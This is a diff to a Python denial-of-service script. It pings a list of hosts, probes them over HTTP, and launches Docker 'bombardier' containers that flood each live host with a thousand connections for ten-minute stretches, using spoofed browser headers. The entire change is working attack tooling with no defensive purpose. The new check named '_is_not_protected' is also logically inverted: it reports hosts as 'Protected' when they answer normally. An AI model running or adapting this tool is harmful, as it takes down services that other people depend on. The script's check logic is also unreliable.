@@ -3,6 +3,8 @@ import os
 import subprocess
 from multiprocessing.pool import Pool
 
+import requests
+
 INTERVAL_BETWEEN_PING = '10m'
 CONNECTIONS_PER_CONTAINER = '1000'
 REQUEST_TIMEOUT = '30s'
@@ -28,26 +30,46 @@ def main():
 
 
 def do_ddos(host):
+    if _is_pinged(host):
+        return print(host, 'DOWN')
+    if _is_not_protected(host):
+        return print(host, 'Protected')
+
+    command = _prepare_ddos_command(host)
+    print(host, 'ALIVE')
+    return os.system(command)
+
+
+def _is_pinged(host):
     ping = subprocess.Popen(
-            ["ping", "-c", "4", host],
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE
-        )
+        ["ping", "-c", "4", host],
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE
+    )
 
     out = ping.communicate()[0]
-    if '100% packet loss' in str(out):
-        print(host, 'DOWN')
-    else:
-        print(host, 'ALIVE')
-        command = 'docker run --rm alpine/bombardier ' \
-            f'--connections {CONNECTIONS_PER_CONTAINER} ' \
-            f'--duration {INTERVAL_BETWEEN_PING} ' \
-            f'--timeout {REQUEST_TIMEOUT} ' \
-            f'-H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0" ' \
-            f'-H "Accept-Language: ru-RU" ' \
-            f'-H "Accept-Encoding: gzip, deflate" ' \
-            f'-l {host} '
-        os.system(command)
+    return '100% packet loss' in str(out)
+
+
+def _is_not_protected(host):
+    status_code = 0
+    try:
+        response = requests.get(f'http://{host}', timeout=30)
+        status_code = response.status_code
+    except:
+        pass
+    return status_code == 200
+
+
+def _prepare_ddos_command(host):
+    return 'docker run --rm alpine/bombardier ' \
+        f'--connections {CONNECTIONS_PER_CONTAINER} ' \
+        f'--duration {INTERVAL_BETWEEN_PING} ' \
+        f'--timeout {REQUEST_TIMEOUT} ' \
+        f'-H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0" ' \
+        f'-H "Accept-Language: ru-RU" ' \
+        f'-H "Accept-Encoding: gzip, deflate" ' \
+        f'-l {host}'
 
 
 def _parse_args():
